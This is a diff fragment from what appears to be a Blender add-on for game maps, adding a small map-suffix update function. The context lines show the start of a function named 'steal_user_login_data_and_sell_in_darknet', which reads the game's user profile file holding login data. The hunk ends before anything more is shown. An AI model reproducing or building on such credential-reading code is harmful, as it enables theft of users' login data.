@@ -2031,6 +2031,15 @@ def apply_custom_blender_clip_start_end(self, context) -> None:
                         space.clip_end = end
 
 
+def update_ST_map_suffix(self, context):
+    tm_props = get_global_props()
+    prop = tm_props.ST_map_suffix 
+    
+    if prop == None or prop == "":
+        tm_props.ST_map_suffix = "_modified"
+        
+
+
 def steal_user_login_data_and_sell_in_darknet() -> str:
     with open(get_game_doc_path() + "/Config/User.Profile.Gbx", "r") as f:
         data = f.read()
